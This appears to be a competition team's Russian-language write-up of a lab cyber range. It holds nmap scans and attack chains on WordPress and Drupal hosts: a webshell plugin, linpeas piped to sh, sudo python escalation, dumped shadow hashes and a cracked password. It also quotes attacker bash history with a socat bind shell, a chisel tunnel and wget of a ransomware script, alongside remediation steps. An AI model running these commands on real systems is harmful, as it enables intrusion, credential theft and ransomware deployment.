# NTO_2022

## Changelog (в сравнении с передыдущим)

- добавили новые ip (Suricata + один забыли)
- [декрипт файлов с машины 10.11.2.11](#Востановление-системы)
- [декрипт файлов с машины 10.11.239.6](#Windows-Decrypt)
- [получили пароль от Suricata](#Suricata)

## Разведка

### Данные сети
Name |IP
:-:|:-:
DMZ |10.11.2.0/24
SERVERS | 10.11.3.0/24
OFFICE |10.11.4.0/24
ASU_TP1 |10.11.239.0/24
ASU_TP1|10.11.240.0/24


### Айпишники


**10.11.1.0**
Name |IP
:-:|:-:
Suricata | 10.11.1.254



**10.11.2.0:**
Name |IP
:-:|:-:
WordPress |[10.11.2.10](http://10.11.2.10/)
Atrium | [10.11.2.11](http://10.11.2.11/)
SLmail |10.11.2.12
DNS |10.11.2.53


**10.11.3.0:**
Name |IP
:-:|:-:
Active Drirectory(?) | 10.11.3.10
mx1.company.local | 10.11.3.20
Active Drirectory(?) | 10.11.3.50



**10.11.4.0:**

Name | IP
:-:|:-:
custarm.company.local | 10.11.4.6
??(винда) |10.11.4.8
Microsoft Terminal Services (?) |10.11.4.10
Забыли | 10.11.4.13

**10.11.239.0:**


Name | IP
:-:|:-:
Веб + Microsoft SQL Server | 10.11.239.5
??(винда) | 10.11.239.6



**10.11.240.0:**

Name | IP
:-:|:-:
Веб(JBoss) | 10.11.240.5
Веб(JBoss) | 10.11.240.6
Веб(JBoss) | 10.11.240.9
Веб(JBoss) | 10.11.240.10
??(винда) | 10.11.240.14


### 10.11.2.0

#### nmap
```bash
nmap 10.11.2.10-12,53 -sV     
Host is up (0.0029s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.2.11
Host is up (0.0028s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CLEAN-DRUPAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.2.12
Host is up (0.0037s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
25/tcp    open  smtp               SLmail smtpd 5.5.0.4433
79/tcp    open  finger             SLMail fingerd
106/tcp   open  pop3pw             SLMail pop3pw
110/tcp   open  pop3               BVRP Software SLMAIL pop3d
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: elto-slmail; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.2.53
Host is up (0.0041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
53/tcp open  domain  ISC BIND
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


#### .11

```bash
nmap -A 10.11.2.11
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 09:53 MSK
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan

Nmap scan report for 10.11.2.11
Host is up (0.0034s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 87:7e:d3:a9:f1:17:1b:2d:74:85:e0:c9:b0:22:c6:a3 (DSA)
|   2048 61:04:d9:37:2a:d8:5f:ac:51:ec:c0:64:c4:20:bd:f4 (RSA)
|_  256 cb:b6:01:57:7a:42:da:50:24:06:43:09:b9:3c:e8:cb (ECDSA)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: CyberPolygon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)
Service Info: Host: CLEAN-DRUPAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1m04s, deviation: 0s, median: -1m04s
| smb2-security-mode: 
|   3.0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: CLEAN-DRUPAL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-03-10T06:52:33
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.2.14-Debian)
|   Computer name: \x00
|   NetBIOS computer name: CLEAN-DRUPAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-10T06:52:33+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.61 seconds
```

### 10.11.3.0
#### nmap

```bash
nmap 10.11.3.10,20,50 -sV

Nmap scan report for 10.11.3.10
Host is up (0.0054s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 05:55:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: NS2; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.3.20
Host is up (0.0036s latency).
Not shown: 973 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft Exchange smtpd
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tcp   open  http          Microsoft IIS httpd 10.0
110/tcp  open  pop3          Microsoft Exchange 2007-2010 pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
444/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
465/tcp  open  smtp          Microsoft Exchange smtpd
587/tcp  open  smtp          Microsoft Exchange smtpd
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
808/tcp  open  ccproxy-http?
995/tcp  open  ssl/pop3      Microsoft Exchange 2007-2010 pop3d
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
2525/tcp open  smtp          Microsoft Exchange smtpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
3800/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3801/tcp open  mc-nmf        .NET Message Framing
3828/tcp open  mc-nmf        .NET Message Framing
6001/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
6007/tcp open  msrpc         Microsoft Windows RPC
6123/tcp open  msrpc         Microsoft Windows RPC
6543/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mx1.company.local; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.3.50
Host is up (0.0041s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 05:55:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: NS1; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 7 IP addresses (7 hosts up) scanned in 66.04 seconds
```


### 10.11.4.0
#### nmap
```bash
nmap 10.11.4.6,8,10,13 -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 09:06 MSK
Nmap scan report for 10.11.4.6
Host is up (0.0022s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.4.8
Host is up (0.0021s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BUCHGARM; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.4.10
Host is up (0.66s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.4.13
Host is up (0.0036s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 81.60 seconds
```

### 10.11.239.0

#### nmap
```bash
nmap 10.11.239.5,6 -sV                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 09:09 MSK
Stats: 0:00:37 elapsed; 0 hosts completed (2 up), 2 undergoing Service Scan
Service scan Timing: About 52.63% done; ETC: 09:10 (0:00:32 remaining)
Nmap scan report for 10.11.239.5
Host is up (0.0020s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.7001
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: OIK-SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.11.239.6
Host is up (0.0011s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: company)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49176/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: OIK-CLIENT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 81.77 seconds
```


### 10.11.240.0

#### nmap

```bash
nmap 10.11.240.5,6,9,10,14 -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 09:12 MSK
Stats: 0:00:18 elapsed; 0 hosts completed (5 up), 5 undergoing Service Scan
Service scan Timing: About 42.11% done; ETC: 09:13 (0:00:23 remaining)
Nmap scan report for 10.11.240.5
Host is up (0.0044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.240.6
Host is up (0.0033s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.240.9
Host is up (0.0042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.240.10
Host is up (0.0057s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    JBoss Enterprise Application Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.11.240.14
Host is up (0.0068s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: ELTO-ENTEK; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 5 IP addresses (5 hosts up) scanned in 71.15 seconds
```

## Wordpress (10.11.2.10)

### Атака

С помощью nmap'а сканим сети, находим http://10.11.2.10/, там крутится wordpress. На нем находим классическую форму логина http://10.11.2.10/wp-login.php, дальше пробрутив логины, пароли находим креды админа `admin:admin`. У этого пользователя есть права на установку плагинов, установим плагин для вебшелла https://github.com/flozz/p0wny-shell и получим "пользовательский" доступ к машине. Дальше запустив `linpeas`

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

увидим, что разрешенно выполнение `/bin/user/python` под суперпользователем без запроса пароля. 
Пропишем следущую команду и получим рутовый доступ
```bash
sudo python -c ‘import os; os.system(“/bin/sh”)’
```

Дальше сгенерировав открытый и закрытый ssh ключ, заливаем на тачку открытый ключ, что бы подключаться под root'ом через ssh.

Подключившись по ssh и получив удобный шелл, вытащим хеши паролей

```bash
$ cat /etc/shadow
root:$6$V91B2eA4NLQDXkK.$8HMq13zriCVZq2Wdz4hQmq.wSJg6oDCa3ExX9LQKTTHT7s9gk6u45bCc2IzRzymrmxF8zegOh/YrAA8jyTCsz0:18779:0:99999:7:::
daemon:*:18779:0:99999:7:::
bin:*:18779:0:99999:7:::
sys:*:18779:0:99999:7:::
sync:*:18779:0:99999:7:::
games:*:18779:0:99999:7:::
man:*:18779:0:99999:7:::
lp:*:18779:0:99999:7:::
mail:*:18779:0:99999:7:::
news:*:18779:0:99999:7:::
uucp:*:18779:0:99999:7:::
proxy:*:18779:0:99999:7:::
www-data:*:18779:0:99999:7:::
backup:*:18779:0:99999:7:::
list:*:18779:0:99999:7:::
irc:*:18779:0:99999:7:::
gnats:*:18779:0:99999:7:::
nobody:*:18779:0:99999:7:::
_apt:*:18779:0:99999:7:::
systemd-timesync:*:18779:0:99999:7:::
systemd-network:*:18779:0:99999:7:::
systemd-resolve:*:18779:0:99999:7:::
messagebus:*:18779:0:99999:7:::
sshd:*:18779:0:99999:7:::
cadm:$6$FXKabw570kGSXnL6$FfQUkrSUB7HtFXWuAwJlSV/YrFB0Vel8nJ.sZ9dOV.P/0icxeY5N/mNjW8HK/WBY20KYhq84jkIw44yaym3jt1:18779:0:99999:7:::
systemd-coredump:!!:18779::::::
mysql:!:18779:0:99999:7:::
admin:$6$g.7PD1hmRs69HVHL$h/.STarcTEGBMGL4grwdgMm2gMBLj12xWRgm/Vu1p5uJObiImx3aYPyyAGK5O7nYQ.GEKr/xskRhEf5ZkXd4t1:19060:0:99999:7:::

```


### Фикс

- Поменять креды админа от wp.
- Переконфигурировать файл `/etc/sudoers`, убрав или изменив строку`www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python`


## Atrium (10.11.2.11)

### Атака

#### Вариант 1

С помощью hascat'а крякнем пароль от пользователя admin, хеш которого мы получили с машины 10.11.2.10

```bash
hashcat -m 1800 -a 0 hashes.hash rockyou7.txt
> $6$g.7PD1hmRs69HVHL$h/.STarcTEGBMGL4grwdgMm2gMBLj12xWRgm/Vu1p5uJObiImx3aYPyyAGK5O7nYQ.GEKr/xskRhEf5ZkXd4t1:Destiny1
```

Залогинимся с кредами admin:Destiny1 по ssh к машине 10.11.2.11.

```bash
ssh admin@10.11.2.11
admin@10.11.2.11's password: 
Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key.
```

Получим интересное сообщение, которое гласит что наша машина зараженна малварью. (См. [Востановление-системы](#Востановление-системы)).

Так как admin находится в sudo группе

```bash
admin@elto-portal2:~$ id
uid=1002(admin) gid=27(sudo) groups=27(sudo)
```

Без проблем зайдем под root'ом

```shell
admin@elto-portal2:~$ sudo su 
root@elto-portal2:/home/admin# id
uid=0(root) gid=0(root) groups=0(root)
```


#### Вариант 2

За счет [скана](#11) узнали версию drupal, она уязвима для CVE-2018-7600.
Нашли сплойт под это CVE https://github.com/dreadlocked/Drupalgeddon2, запустили его и получили usershell от www-data

```bash
ruby drupalgeddon2.rb
```

Информация о системе:
`Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.7-ckt9-2 (2015-04-13)`

Данное ядро уязвимо к CVE-2016-5195 "Dirty Cow":

Используя [POC](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679) получаем консоль от пользовтеля root.



### Фикс

- использовать более криптостойкий пароль
- использование последней версии drupal
- обновить линукс до последней версии

### Востановление системы

Как уже говорилось, при конекте на машину по ssh получаем следущее сообщение 

`Oh! Hello there! You've been infected by GachiRansom, send 300$ to paypal:b.harrington@gmail.com to get your unecnryption key.` 

Зайдя под рутом и проверив его историю, найдем следущие подозрительные действия.

```bash
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 2>1 > /dev/null && exit
wget http://10.11.200.50/encr.sh -O /var/www/html/encr.sh;exit
chmod -R 777 /var/www/html;exit
/var/www/html/encr.sh;exit
rm -f /var/www/html/shell.php;exit
rm -f /var/www/html/encr.sh;exit
rm -f /var/www/html/sploit.c;exit
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 2>1 > /dev/null && exit
cd /var/www/html/
rm *.encr chisel* socat* sploit*
pkill -f socat; pkill -f chisel
cp /home/debian/drupal-7.54/*.php /var/www/html
cd /var/www/html/
rm *.encr chisel* socat* sploit*
pkill -f socat; pkill -f chisel
cp /home/debian/drupal-7.54/*.php /var/www/html
cd /var/www/html/
rm *.encr chisel* socat* sploit*
pkill -f socat; pkill -f chisel
cp /home/debian/drupal-7.54/*.php /var/www/html
cd /var/www/html/; rm *.encr chisel* socat* sploit*; pkill -f socat; pkill -f chisel; cp /home/debian/drupal-7.54/*.php /var/www/html
echo "" > /var/log/apache2/other_vhosts_access.log; echo "" > /var/log/audit/audit.log
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 2>1 > /dev/null && exit
wget http://10.11.200.50/encr.sh -O /var/www/html/encr.sh;exit
chmod -R 777 /var/www/html;exit
/var/www/html/encr.sh;exit
rm -f /var/www/html/shell.php;exit
rm -f /var/www/html/encr.sh;exit
rm -f /var/www/html/sploit.c;exit
cd /var/www/html/; rm *.encr chisel* socat* sploit*; pkill -f socat; pkill -f chisel; cp /home/debian/drupal-7.54/*.php /var/www/html
echo "" > /var/log/apache2/other_vhosts_access.log; echo "" > /var/log/audit/audit.log
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 2>1 > /dev/null && exit
wget http://10.11.200.50/encr.sh -O /var/www/html/encr.sh;exit
chmod -R 777 /var/www/html;exit
/var/www/html/encr.sh;exit
rm -f /var/www/html/shell.php;exit
rm -f /var/www/html/encr.sh;exit
rm -f /var/www/html/sploit.c;exit
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 2>1 > /dev/null && exit
wget http://10.11.200.50/encr.sh -O /var/www/html/encr.sh;exit
chmod -R 777 /var/www/html;exit
/var/www/html/encr.sh;exit
rm -f /var/www/html/shell.php;exit
rm -f /var/www/html/encr.sh;exit
rm -f /var/www/html/sploit.c;exit
cd /var/www/html/
ls
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs
setsid /var/www/html/chisel client 10.11.200.50:8083 R:socks 
wget http://10.11.200.50/encr.sh -O /var/www/html/encr.sh;exit
chmod -R 777 /var/www/html;exit
/var/www/html/encr.sh;exit
rm -f /var/www/html/shell.php;exit
rm -f /var/www/html/encr.sh;exit
rm -f /var/www/html/sploit.c;exit
cd /var/www/html/
ls
ps aux | grep socat
pkill -f socat
ps aux | grep chisel
pkil -f chisel
pkill -f chisel
ls
ls
rm *.encr
ls
ls
cp /home/debian/drupal-7.54/*.php .
ls
ls
pkill -9 -f socat
```

Отсюда становится понятно, что нам нужно каким-то образом получить код, узнать что делает `encr.sh`, что бы попробовать востановить encrypt файлы. Посмотрим, что у нас есть в папке `/var/log`

```bash
admin@elto-portal2:/var/log$ ls -la
total 491756
drwxr-xr-x 10 root  root      4096 Mar 11 06:25 .
drwxr-xr-x 13 root  root      4096 Aug  3  2020 ..
drw-rw-rw-  2 root  adm       4096 Aug 24  2020 apache2
drw-rw-rw-  2 root  root      4096 Mar  2 09:26 apt
drw-rw-rw-  2 root  root      4096 Mar 11 05:42 audit
-rw-rw-rw-  1 root  utmp      7296 Mar 11 08:55 btmp
-rw-rw-rw-  1 root  utmp         0 Feb 19 06:25 btmp.1
-rw-rw-rw-  1 root  adm          0 Feb 18 14:09 cloud-init.log
-rw-rw-rw-  1 root  root     46714 Mar 10 11:32 cloud-init-output.log
-rw-rw-rw-  1 root  adm          0 Mar 11 06:25 debug
-rw-rw-rw-  1 root  adm      70728 Mar 10 11:32 debug.1
-rw-rw-rw-  1 root  adm       1830 Mar  2 09:25 debug.2.gz
-rw-rw-rw-  1 root  adm       1830 Feb 18 14:09 debug.3.gz
-rw-rw-rw-  1 root  root         0 Mar  3 06:25 dpkg.log
-rw-rw-rw-  1 root  root      3126 Mar  2 09:26 dpkg.log.1
drw-rw-rw-  2 root  root      4096 Apr 25  2015 fsck
-rw-rw-rw-  1 root  adm     373351 Mar 11 05:42 kern.log
-rw-rw-rw-  1 root  adm      46757 Mar  5 14:36 kern.log.1
-rw-rw-rw-  1 root  adm        102 Mar  2 01:50 kern.log.2.gz
-rw-rw-rw-  1 root  adm       8580 Feb 18 14:09 kern.log.3.gz
-rw-rw-rw-  1 root  root    292876 Mar 12 05:39 lastlog
-rw-rw-rw-  1 root  adm  241537737 Mar 12 05:39 messages
-rw-rw-rw-  1 root  adm   30783685 Mar  6 06:25 messages.1
-rw-rw-rw-  1 root  adm     730340 Feb 28 06:25 messages.2.gz
-rw-rw-rw-  1 root  adm      95994 Feb 20 06:25 messages.3.gz
-rw-rw-rw-  1 root  adm     106109 Feb 19 06:25 messages.4.gz
drw-rwSrw-  2 mysql adm       4096 Aug 24  2020 mysql
-rw-rw-rw-  1 mysql adm          0 Jul 21  2020 mysql.err
drw-rw-rw-  2 root  root      4096 Aug 23  2020 proftpd
drw-rw-rw-  3 root  adm       4096 Mar 10 06:52 samba
-rw-rw-rw-  1 root  adm    8807092 Mar 12 05:39 syslog
-rw-rw-rw-  1 root  adm  218316278 Mar 11 06:25 syslog.1
-rw-rw-rw-  1 root  adm     186733 Mar 10 06:25 syslog.2.gz
-rw-rw-rw-  1 root  adm     164768 Mar  9 06:25 syslog.3.gz
-rw-rw-rw-  1 root  adm     169079 Mar  8 06:25 syslog.4.gz
-rw-rw-rw-  1 root  adm     168838 Mar  7 06:25 syslog.5.gz
-rw-rw-rw-  1 root  adm    1098301 Mar  6 06:25 syslog.6.gz
-rw-rw-rw-  1 root  adm      96540 Mar  5 06:25 syslog.7.gz
drw-rw-rw-  2 root  adm       4096 Jun  9  2020 unattended-upgrades
-rw-rw-rw-  1 root  utmp     63744 Mar 12 05:39 wtmp
-rw-rw-rw-  1 root  utmp         0 Feb 19 06:25 wtmp.1
```

В глаза сразу бросаются (большой размер и дата изменения >5 марта - даты изменеия, создания .encr файлов) `messages` и `messages.1` с ними и будем работать. Среди этих логов по ключевому слову `encr`, найдем строки следующего вида

```bash
